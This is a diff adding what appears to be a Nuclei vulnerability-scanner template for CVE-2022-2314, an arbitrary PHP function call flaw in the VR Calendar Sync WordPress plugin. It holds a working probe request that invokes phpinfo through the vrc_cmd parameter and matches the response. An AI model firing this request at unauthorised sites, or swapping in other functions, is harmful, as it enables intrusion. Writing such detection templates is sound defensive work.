@@ -1,0 +1,27 @@
+id: wordpress-vr-calendar-cmd-exec
+info:
+  name: Arbitrary Function Invocation in VR Calendar Sync Plugin
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WordPress plugin VR Calendar 2.2.2 and earlier contains an arbitrary method call vulnerability. An attacker could use this vulnerability to execute arbitrary PHP functions on the website.
+  reference:
+    - https://wordpress.org/plugins/vr-calendar-sync/
+  classification:
+    cve-id: CVE-2022-2314
+    cvss-score: 9.6
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-post.php?vrc_cmd=phpinfo HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "PHP Version"
+        part: body
